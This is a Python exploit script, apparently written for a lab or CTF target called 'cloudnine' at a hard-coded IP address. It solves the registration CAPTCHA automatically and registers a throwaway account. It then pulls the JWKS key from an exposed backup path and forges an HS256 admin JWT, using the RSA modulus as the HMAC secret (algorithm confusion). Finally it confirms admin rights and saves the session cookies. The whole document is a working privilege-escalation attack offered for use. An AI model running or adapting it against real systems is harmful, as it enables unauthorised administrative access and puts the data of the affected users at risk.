import requests, re, random, string, base64, json, hashlib, hmac, time, sys, urllib.parse
BASE=sys.argv[1] if len(sys.argv)>1 else 'http://15.252.91.100'
S=requests.Session(); S.headers.update({'User-Agent':'Mozilla/5.0'})

def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def b64ud(x): return base64.urlsafe_b64decode(x+'='*(-len(x)%4))
def csrf(h):
    m=re.search(r'name="csrfmiddlewaretoken" value="([^"]*)"',h); return m.group(1) if m else None
def solve(h):
    q=re.search(r'class="captcha-question"[^>]*>(.*?)</',h,re.S); cid=re.search(r'name="captcha_id" value="([^"]*)"',h)
    m=re.search(r'(\d+)\s*([\+\-\*x×])\s*(\d+)',q.group(1)); a,op,b=int(m.group(1)),m.group(2),int(m.group(3))
    return cid.group(1),{'+':a+b,'-':a-b,'*':a*b}[op]

# 1) register + login
U='dfr'+''.join(random.choices(string.ascii_lowercase,k=8)); P='Passw0rd!zz'
r=S.get(BASE+'/register/'); t=csrf(r.text); cid,ans=solve(r.text)
r=S.post(BASE+'/register/',data={'csrfmiddlewaretoken':t,'username':U,'email':U+'@c.com','password':P,'captcha_id':cid,'captcha_answer':str(ans)},headers={'Referer':BASE+'/register/'})
print('[*] registered', U, '->', r.url)
jwt=S.cookies.get('cloudnine_access')
payload=json.loads(b64ud(jwt.split('.')[1]))
print('[*] jwt payload', payload)

# 2) grab JWKS public key
r=S.get(BASE+'/backup/auth/jwks.json')
print('[*] jwks status', r.status_code)
jwks=r.json()
print('[*] jwks', json.dumps(jwks)[:300])
n_str=jwks['keys'][0]['n']  # base64url modulus string used verbatim as HMAC key

# 3) forge HS256 admin token using n string as HMAC secret
now=int(time.time())
adm=dict(payload); adm['role']='admin'; adm['is_admin']=True; adm['iat']=now; adm['exp']=now+36000
header={'alg':'HS256','kid':jwks['keys'][0].get('kid','cloudnine-prod'),'typ':'JWT'}
si=(b64u(json.dumps(header,separators=(',',':')))+'.'+b64u(json.dumps(adm,separators=(',',':')))).encode()
for secret in [n_str.encode(), n_str.encode('utf-8')]:
    sig=hmac.new(secret, si, hashlib.sha256).digest()
    tok=si.decode()+'.'+b64u(sig)
    S.cookies.set('cloudnine_access', tok, domain=BASE.split('//')[1].split(':')[0])
    prof=S.get(BASE+'/api/profile/').json()
    print('[*] forged token -> token_role', prof.get('token_role'),'is_admin',prof.get('is_admin'),'import_url',prof.get('features',{}).get('import_url'))
    if prof.get('is_admin') or prof.get('token_role')=='admin':
        print('[+] ADMIN achieved'); break

open('cn_state.json','w').write(json.dumps({'cookies':S.cookies.get_dict(),'user':U,'n':n_str}))
print('[*] state saved')
